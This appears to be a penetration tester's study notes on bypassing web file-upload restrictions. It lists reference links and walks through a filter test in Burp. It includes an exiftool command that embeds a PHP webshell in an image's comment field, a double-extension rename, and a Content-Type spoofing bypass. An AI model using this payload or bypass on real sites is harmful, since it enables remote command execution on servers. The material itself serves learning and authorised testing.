Upload_restrictions

## Have to work on

https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf

https://pentestlab.blog/2012/11/29/bypassing-file-upload-restrictions/

https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass

http://www.hackingarticles.in/5-ways-file-upload-vulnerability-exploitation/

https://www.sans.org/reading-room/whitepapers/testing/web-application-file-upload-vulnerabilities-36487

https://www.owasp.org/index.php/Unrestricted_File_Upload

## Inject malicious php into a picture

- https://techyzilla.blogspot.com/2012/07/injecting-malicious-php-in-to-an-image-file.html

---

- another one : https://sushant747.gitbooks.io/total-oscp-guide/bypass_image_upload.html

- ```exiftool -Comment='<?php system($_REQUEST['cmd']); ?>' pic.jpg```
- ```mv pic.jpg pic.php.jpg```

## Example : Bypass security filter to upload php instead of other stuff

- If I submit a simple php webshell instead of a picture, it returns “Invalid file”. There is some filtering going on that I’ll need to bypass.

- I’ll find the allowed upload of a PNG in Burp and send it to Repeater. There are three common ways that a website will check for valid file types by comparing them to an allow- or deny-list:

1. File extension
2. Content-Type header
3. Magic bytes

- I’ll start by changing one at a time to see if the site blocks. First, I’ll change the extension to .php. It works.

- If I change the Content-Type header to application/x-php, it blocks it (even with the file name changed back to .png).

- Changing the content doesn’t seem to matter.

- Based on the filter testing, it seems like I can name a file .php and include PHP code, as long as I change the Content-Type header to a valid image.